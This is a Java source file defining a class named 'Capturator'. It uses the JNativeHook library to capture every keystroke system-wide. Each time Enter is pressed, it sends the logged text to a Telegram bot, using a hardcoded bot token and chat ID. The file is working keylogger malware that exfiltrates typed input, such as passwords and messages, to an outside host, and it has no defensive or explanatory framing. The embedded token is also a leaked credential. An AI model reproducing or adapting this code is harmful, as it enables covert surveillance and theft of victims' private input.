package Dime;

import java.io.BufferedInputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class Capturator implements NativeKeyListener {
	String texto =new String();

	@Override
	public void nativeKeyPressed(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		String tecla = NativeKeyEvent.getKeyText(arg0.getKeyCode());
		if(arg0.getKeyCode() == 57)	tecla ="";
		if(arg0.getKeyCode() == 42)	tecla ="press " + tecla;
		texto+=tecla;
		if(arg0.getKeyCode() == 28) {
			try {
				send(texto);
//				texto="";

			} catch (IOException e) {}

		}


	}
	public void send(String text) throws IOException{
		text =URLEncoder.encode(text,"UTF-8");
		String apiToken  = "bot5071705506:AAHEI1MvzzbGjhRTapDRIxEvF48Hh9VZAwk";
		String chatID="@Ifous";


		String url ="https://api.telegram.org/" + apiToken + "/sendMessage?chat_id=" + chatID + "&text=" + text ;
		System.out.print(url);
		URL u =new URL(url);
		URLConnection con =u.openConnection();
		new BufferedInputStream(con.getInputStream());
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub

	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub

	}
}
